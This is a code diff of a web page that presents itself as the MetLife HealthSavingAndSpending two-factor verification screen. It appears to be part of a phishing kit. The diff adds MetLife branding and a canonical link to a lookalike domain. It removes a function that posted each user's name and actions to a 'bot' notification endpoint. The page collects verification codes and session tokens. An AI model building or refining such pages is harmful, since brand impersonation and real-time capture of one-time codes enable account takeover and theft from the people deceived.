@@ -1,12 +1,23 @@
 <!doctype html>
 <html lang="en">
   <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Two-Factor Authentication - Life Portal</title>
+    <title>Two-Factor Authentication - MetLife HealthSavingAndSpending Portal</title>
     <link rel="stylesheet" href="styles.css">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
-   
+
+    <!-- Primary Meta Tags -->
+    <meta name="description" content="Secure your MetLife HealthSavingAndSpending account with two-factor authentication. Complete 2FA verification to access your HSA and FSA accounts safely.">
+    <meta name="keywords" content="MetLife 2FA, two-factor authentication, account security, HSA security, FSA account protection">
+    <meta name="author" content="MetLife">
+
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://healthsavingsandspending-metlife.com/verify-code">
+
+    <!-- Additional Meta Tags -->
+    <meta name="language" content="English">
+    <meta name="theme-color" content="#0078b7">
  
 <style>
 .loading-spinner{display:inline-block;width:12px;height:12px;border:2px solid #f3f3f3;border-top:2px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin-right:5px}
@@ -104,7 +115,7 @@ function initPage() {
     verifyText.textContent = 'A verification code was sent to your email address.';
   }
   
-  
+
 }
 
 function toggleCode(){
@@ -134,7 +145,7 @@ function resend(){
   .then(result => {
     if (result.ok) {
       showMessage('A new verification code has been sent.', 'success');
-      sendBotNotification(username, 'resend_code', `User clicked resend verification code via ${method}`);
+
       startResendTimer();
     } else {
       showMessage('Failed to resend code. Please try again.', 'error');
@@ -170,32 +181,20 @@ function startResendTimer() {
   }, 1000);
 }
 
-function sendBotNotification(username, action, message) {
-  fetch(window.metlife_API_BASE + '/api/bot/send-notification', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      username: username,
-      action: action,
-      message: message,
-      botName: window.APP_CONFIG.botName,
-      timestamp: new Date().toISOString(),
-    }),
-  })
-  .catch(err => {
-    console.error('Failed to send bot notification:', err);
-  });
-}
-
 function submitCode(){
   const code = document.getElementById('code').value.trim();
   const username = localStorage.getItem('metlife_username');
   const tempToken = localStorage.getItem('temp_token');
+  const method = localStorage.getItem('verification_method');
+  console.log('Submitting code:', tempToken, 'for user:', username, 'using method:', method);
   
   if (!code) {
     showMessage('Please enter the verification code.', 'error');
+    return;
+  }
+  if (!tempToken || !method) {
+    showMessage('Session expired. Please log in again.', 'error');
+   
     return;
   }
   
@@ -213,6 +212,7 @@ function submitCode(){
     body: JSON.stringify({
       username: username,
       code: code,
+      method: method,
     }),
   })
   .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
